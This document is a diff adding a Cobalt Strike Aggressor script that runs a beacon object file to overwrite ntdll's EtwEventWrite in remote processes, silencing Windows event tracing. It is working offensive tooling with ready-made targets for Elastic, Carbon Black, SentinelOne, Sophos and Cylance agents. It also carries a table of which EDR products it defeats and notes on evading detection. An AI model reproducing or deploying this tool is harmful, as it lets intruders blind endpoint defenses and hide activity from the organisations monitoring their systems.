@@ -1,0 +1,168 @@
+# etwpatch.cna — Aggressor script for etwpatch BOF
+#
+# Per-process EtwEventWrite nullification via WriteProcessMemory.
+# Patches ntdll!EtwEventWrite and ntdll!EtwEventWriteFull in target processes
+# with  xor eax, eax / ret  (3 bytes: 33 C0 C3).
+#
+# Why this is the most stealthy ETW technique:
+#   - Session stays "Running" — logman/sc query show no changes
+#   - No stop events generated (unlike etw_tamper mode 0)
+#   - EDR's EtwEventWrite returns STATUS_SUCCESS — it "thinks" it logged
+#   - Patch is CoW-isolated per process — other processes unaffected
+#   - ntdll ASLR is per-boot (same VA in every process) — no symbol resolution
+#     needed across processes
+#
+# Limitation: PPL (Protected Process Light) processes block WriteProcessMemory
+# even from SYSTEM. MDE (MsSense.exe) and Windows Defender run as PPL.
+# Use etw_tamper for PPL targets; etwpatch for non-PPL (Elastic, Carbon Black,
+# SentinelOne in most configs, Sophos, etc.)
+#
+# Modes:
+#   patch   — apply xor eax,eax / ret patch
+#   restore — restore original bytes (read from local ntdll via GetProcAddress)
+#   check   — probe PPL status and current patch state
+#
+# Usage:
+#   etwpatch patch svchost.exe              patch all svchost.exe instances
+#   etwpatch patch MsSense.exe              will fail (PPL), shows advice
+#   etwpatch patch 1234                     patch by PID
+#   etwpatch restore svchost.exe            restore original bytes
+#   etwpatch check MsSense.exe              probe PPL + patch state
+#   etwpatch patch elastic                  vendor shortcut: Elastic stack procs
+#   etwpatch patch carbonblack              vendor shortcut: Carbon Black procs
+#   etwpatch patch sentinelone              vendor shortcut: SentinelOne procs
+
+# Vendor → process name mappings
+sub _etwpatch_procs_for {
+    local('$vendor');
+    $vendor = $1;
+
+    if ($vendor eq "elastic") {
+        return "elastic-endpoint.exe;elastic-agent.exe;winlogbeat.exe";
+    } else if ($vendor eq "carbonblack" || $vendor eq "cb") {
+        return "CbDefense.exe;cb.exe;CarbonBlack.exe;RepMgr.exe";
+    } else if ($vendor eq "sentinelone" || $vendor eq "s1") {
+        return "SentinelAgent.exe;SentinelServiceHost.exe;SentinelStaticEngine.exe";
+    } else if ($vendor eq "sophos") {
+        return "SophosEDR.exe;SophosUI.exe;SophosNtpService.exe";
+    } else if ($vendor eq "cylance") {
+        return "CylanceSvc.exe;CylanceUI.exe";
+    }
+    return $null;
+}
+
+# Resolve mode string to integer
+sub _etwpatch_mode {
+    local('$verb');
+    $verb = $1;
+    if ($verb eq "patch")   { return 0; }
+    if ($verb eq "restore") { return 1; }
+    if ($verb eq "check")   { return 2; }
+    return -1;
+}
+
+alias etwpatch {
+    local('$bof $args $bid $handle $path $mode $target $preset $modeInt');
+    $bid  = $1;
+    $path = script_resource("etwpatch.x64.o");
+
+    $handle = openf($path);
+    if ($handle is $null) {
+        berror($bid, "[etwpatch] Cannot open BOF: " . $path);
+        return;
+    }
+    $bof = readb($handle, 1048576);
+    closef($handle);
+    if ($bof is $null) {
+        berror($bid, "[etwpatch] readb failed for: " . $path);
+        return;
+    }
+    println("[etwpatch] loaded " . strlen($bof) . " bytes from " . $path);
+
+    if (size(@_) < 3) {
+        berror($bid, "[etwpatch] Usage:\n" .
+            "  etwpatch patch   <process.exe|PID>   null EtwEventWrite in target\n" .
+            "  etwpatch restore <process.exe|PID>   restore original bytes\n" .
+            "  etwpatch check   <process.exe|PID>   probe PPL + patch state\n" .
+            "  etwpatch patch   elastic|carbonblack|sentinelone|sophos   vendor shortcut\n\n" .
+            "PPL NOTE: MDE (MsSense.exe), Defender, CrowdStrike run as PPL.\n" .
+            "          WriteProcessMemory will fail — use 'etw_tamper starve' for PPL targets.");
+        return;
+    }
+
+    $modeInt = _etwpatch_mode($2);
+    if ($modeInt == -1) {
+        berror($bid, "[etwpatch] Unknown mode '" . $2 . "' — use: patch, restore, check");
+        return;
+    }
+
+    # Check for vendor shortcut (only valid for patch/restore)
+    $preset = _etwpatch_procs_for($3);
+    if ($preset !is $null) {
+        $target = $preset;
+        if ($modeInt == 0) {
+            btask($bid, "EtwPatch: PATCHING EtwEventWrite in " . $3 . " processes -> " . $target);
+        } else if ($modeInt == 1) {
+            btask($bid, "EtwPatch: RESTORING EtwEventWrite in " . $3 . " processes -> " . $target);
+        } else {
+            btask($bid, "EtwPatch: CHECKING PPL/patch state for " . $3 . " -> " . $target);
+        }
+    } else {
+        $target = $3;
+        if ($modeInt == 0) {
+            btask($bid, "EtwPatch: PATCHING EtwEventWrite in -> " . $target);
+        } else if ($modeInt == 1) {
+            btask($bid, "EtwPatch: RESTORING EtwEventWrite in -> " . $target);
+        } else {
+            btask($bid, "EtwPatch: CHECKING PPL/patch state for -> " . $target);
+        }
+    }
+
+    # i = int32 (mode), Z = null-terminated wide string (process name or PID list)
+    $args = bof_pack("iZ", $modeInt, $target);
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+beacon_command_register(
+    "etwpatch",
+    "Patch EtwEventWrite in target processes via WriteProcessMemory — stealthiest ETW technique",
+    "Usage:\n" .
+    "  etwpatch patch   <process.exe|PID>   null EtwEventWrite/EtwEventWriteFull\n" .
+    "  etwpatch restore <process.exe|PID>   restore original bytes from local ntdll\n" .
+    "  etwpatch check   <process.exe|PID>   probe PPL status + current patch state\n" .
+    "  etwpatch patch   elastic             Elastic endpoint stack (non-PPL)\n" .
+    "  etwpatch patch   carbonblack         Carbon Black processes (non-PPL)\n" .
+    "  etwpatch patch   sentinelone         SentinelOne processes (most configs non-PPL)\n" .
+    "  etwpatch patch   sophos              Sophos EDR processes\n\n" .
+    "Examples:\n" .
+    "  etwpatch patch svchost.exe\n" .
+    "  etwpatch check MsSense.exe\n" .
+    "  etwpatch patch elastic\n" .
+    "  etwpatch restore elastic\n\n" .
+    "How it works:\n" .
+    "  ntdll ASLR base is randomized at boot but identical across ALL processes in\n" .
+    "  the same boot session. EtwEventWrite VA in process X == VA in process Y.\n" .
+    "  Patch: WriteProcessMemory(hProc, pEtwEventWrite, [33 C0 C3], 3)\n" .
+    "         xor eax, eax / ret — function returns STATUS_SUCCESS immediately.\n" .
+    "  CoW:  The write triggers Copy-on-Write on the ntdll page — only target\n" .
+    "        process sees the patch. Other processes are unaffected.\n" .
+    "  Restore: read original bytes from OUR local ntdll (unpatched, pre-CoW),\n" .
+    "           write them back into target process.\n\n" .
+    "Why this is Tier S stealth:\n" .
+    "  - ETW session stays 'Running' — logman/Event Viewer show no anomaly\n" .
+    "  - No STOP event generated (unlike etw_tamper mode 0)\n" .
+    "  - EtwEventWrite returns STATUS_SUCCESS — EDR thinks events are logged\n" .
+    "  - No registry changes, no service changes, no network changes\n" .
+    "  - Only artifact: ntdll page CoW in target process (unusual page flags)\n\n" .
+    "PPL compatibility matrix:\n" .
+    "  MDE (MsSense.exe)        PPL-Antimalware  => WriteProcessMemory DENIED\n" .
+    "  Windows Defender         PPL-Antimalware  => WriteProcessMemory DENIED\n" .
+    "  CrowdStrike Falcon        PPL-Protected    => WriteProcessMemory DENIED\n" .
+    "  SentinelOne (most)        Non-PPL          => PATCH WORKS\n" .
+    "  Elastic Endpoint          Non-PPL          => PATCH WORKS\n" .
+    "  Carbon Black              Non-PPL          => PATCH WORKS\n" .
+    "  Sophos EDR                Non-PPL          => PATCH WORKS\n\n" .
+    "For PPL targets: use 'etw_tamper starve' instead.\n\n" .
+    "Requires: local admin (for PROCESS_VM_WRITE + PROCESS_VM_OPERATION)\n" .
+    "Verify:   etwpatch check <process>  — shows [PATCHED] or [ORIGINAL]"
+);
